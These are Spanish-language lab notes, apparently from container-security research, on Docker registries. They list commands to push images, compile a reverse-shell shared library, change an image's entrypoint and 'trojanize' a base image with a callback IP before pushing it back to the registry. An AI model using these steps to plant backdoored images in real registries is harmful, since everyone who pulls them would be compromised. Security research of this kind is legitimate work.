Pushear un container:

docker tag busybox 127.0.0.1:5000/cr0hn/busybox
docker tag postgres:9.6.1-alpine 127.0.0.1:5000/cr0hn/postgres

docker push 127.0.0.1:5000/cr0hn/busybox
docker push 127.0.0.1:5000/cr0hn/postgres


Cosas chulas:

-= Borrado de imágenes =-

No se pueden borrar imágenes ni manifest de los registries, a no ser que lo actives expresamente. Por defecto no se puede, ya que se configura el registry como: "pull-through cache":

docker run -d -p 5000:5000 --restart=always --name registry \
             -v `pwd`/config.yml:/etc/docker/registry/config.yml \
             registry:2

> config.yml:

delete:
    enabled: false

Es decir:

Si te suben un malware estará ahí por los tiempos de los tiempos.

referencias:
- Fichero de configuracion: https://docs.docker.com/registry/configuration/
- Pull through cache: https://docs.docker.com/registry/recipes/mirror/

-= Subida de ficheros =-

Si subes un fichero a un registry, se queda registrado, pero no se puede acceder a él salvo que tengas el digest. Y tampoco se puede borrar si está el Registry por defecto.

-= Compilar la librerya dinámica =-

gcc -c -fpic reverse_shell_library.c
gcc -shared -o reverse_shell.so reverse_shell_library.o


-= Cambiar entry-point ejemplo =-

1 - Mostrar la info de la imagen "rawmind/alpine-traefik:1.1.2-1"

python __main__.py -vvvvvv image info docker_images/alpine-traefik\:1.1.2-1

2 - Cambiar el entry-point

python __main__.py -vvvvvv image modify entrypoint docker_images/alpine-traefik:1.1.2-1 /bin/bash

3 - Mostrar la info del nuevo container:

python __main__.py -vvvvvv image info alpine-traefik\:1.1.2-1.tar

4 - Cargar el container en docker:

docker load -i alpine-traefik\:1.1.2-1.tar

5 - Ejecutar el container

docker run --rm rawmind/alpine-traefik:1.1.2-1

Y de modo interactivo (recordar que se ha cambiado el entry-point a bash. Lo que implica que se ejecutará y acabará bash):

docker run --rm -it rawmind/alpine-traefik:1.1.2-1


-= Creando la imágenes de docker =-

Crear debian base:

docker build -t localhost:5000/debian-base:latest .
docker push localhost:5000/debian-base:latest
docker save localhost:5000/debian-base:latest -o debian-base:latest

Troyanizamos imagen:

python __main__.py image modify trojanize debian-base/debian-base\:latest -l 192.168.43.196

Cargamos imagen troyanizada:

docker load -i debian-base\:latest

Pusheamos la imagen:

docker push localhost:5000/debian-base:latest

Cargamos el nginx

docker build -t nginx-trojanized .
